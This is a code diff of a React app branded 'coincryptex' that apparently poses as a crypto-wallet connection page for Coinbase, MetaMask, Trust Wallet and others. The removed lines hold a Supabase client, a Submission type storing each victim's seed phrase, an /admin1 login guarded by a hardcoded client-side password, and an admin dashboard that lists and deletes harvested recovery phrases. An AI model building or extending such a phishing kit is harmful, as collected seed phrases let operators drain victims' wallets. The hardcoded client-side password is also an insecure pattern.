@@ -1,13 +1,8 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { Bell, CheckCircle, ShieldCheck, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
-import { BrowserRouter as Router, Route, Routes, useNavigate } from "react-router-dom";
-import { createClient } from "@supabase/supabase-js";
+import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
 import coincryptexLogo from "./icons/coincryptex.png";
-
-const SUPABASE_URL = "https://db.tfkeuiktciczxurlvuct.supabase.co";
-const SUPABASE_KEY = "YOUR_ANON_OR_SERVICE_KEY_HERE"; // replace with your anon key for frontend testing
-const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 import coinbaseIcon from "./icons/coinbase.webp";
 import metamaskIcon from "./icons/metamask.webp";
@@ -18,13 +13,6 @@ import "./App.css";
 interface Wallet {
   name: string;
   icon: string;
-}
-
-interface Submission {
-  id?: number;
-  wallet: string;
-  seedPhrase: string;
-  timestamp: number;
 }
 
 function Button({ children, onClick, disabled }: { children: React.ReactNode, onClick: () => void, disabled?: boolean }) {
@@ -223,110 +211,9 @@ function App() {
             ][page]}
           </motion.div>
         } />
-        <Route path="/admin1" element={<AdminLogin />} />
-        <Route path="/admin1/dashboard" element={<AdminDashboard />} />
       </Routes>
     </Router>
   );
 }
 
 export default App;
-// Remove stray closing brace
-
-function AdminLogin() {
-  const navigate = useNavigate();
-  const [password, setPassword] = useState("");
-  const [error, setError] = useState("");
-  // Example complex password
-  const correctPassword = "CryptoAdmin!2026";
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (password === correctPassword) {
-      setError("");
-      navigate("/admin1/dashboard");
-    } else {
-      setError("Incorrect password. Try again.");
-    }
-  };
-
-  return (
-    <div className="page admin-login-page">
-      <h1 className="title">Admin Login</h1>
-      <form onSubmit={handleSubmit} style={{ maxWidth: 320, margin: "0 auto" }}>
-        <input
-          type="password"
-          value={password}
-          onChange={e => setPassword(e.target.value)}
-          placeholder="Enter admin password"
-          className="seed-input"
-          style={{ marginBottom: 16 }}
-        />
-        <Button onClick={() => {}} disabled={password.length === 0}>Login</Button>
-        {error && <div className="error-message">{error}</div>}
-      </form>
-    </div>
-  );
-}
-
-function AdminDashboard() {
-  const [submissions, setSubmissions] = useState<Submission[]>([]);
-  const walletIcons: { [name: string]: string } = {
-    "Coinbase": coinbaseIcon,
-    "MetaMask": metamaskIcon,
-    "Trust Wallet": trustwalletIcon,
-    "DeFi Wallet": defiIcon
-  };
-  useEffect(() => {
-    const loadSubmissions = async () => {
-      try {
-        const response = await fetch("/api/submissions");
-        const data: Submission[] = await response.json();
-        setSubmissions(data);
-      } catch (err) {
-        console.error("failed to load submissions", err);
-      }
-    };
-    loadSubmissions();
-  }, []);
-
-  const deleteSubmission = async (id: number | undefined) => {
-    if (id === undefined) return;
-    try {
-      await fetch(`/api/submissions?id=${id}`, {
-        method: "DELETE"
-      });
-      setSubmissions((prev) => prev.filter((s) => s.id !== id));
-    } catch (err) {
-      console.error("delete submission error", err);
-    }
-  };
-
-  return (
-    <div className="page admin-page">
-      <h1 className="title">Admin Dashboard</h1>
-      {submissions.length === 0 ? (
-        <p>No wallet submissions yet.</p>
-      ) : (
-        <div className="admin-grid scrollable-admin-grid">
-          {submissions.map((s) => (
-            <div key={s.id} className="admin-card beautiful-admin-card">
-              <div className="admin-header">
-                <img src={walletIcons[s.wallet] || coincryptexLogo} alt={s.wallet} className="admin-wallet-icon" />
-                <span className="admin-wallet-name">{s.wallet}</span>
-                <button className="admin-delete-btn" onClick={() => deleteSubmission(s.id)}>Delete</button>
-              </div>
-              <div className="admin-seed">
-                <span className="admin-seed-label">Seed Phrase:</span>
-                <span className="admin-seed-value">
-                  {s.seedPhrase}
-                </span>
-              </div>
-              <span className="admin-timestamp">{new Date(s.timestamp).toLocaleString()}</span>
-            </div>
-          ))}
-        </div>
-      )}
-    </div>
-  );
-}
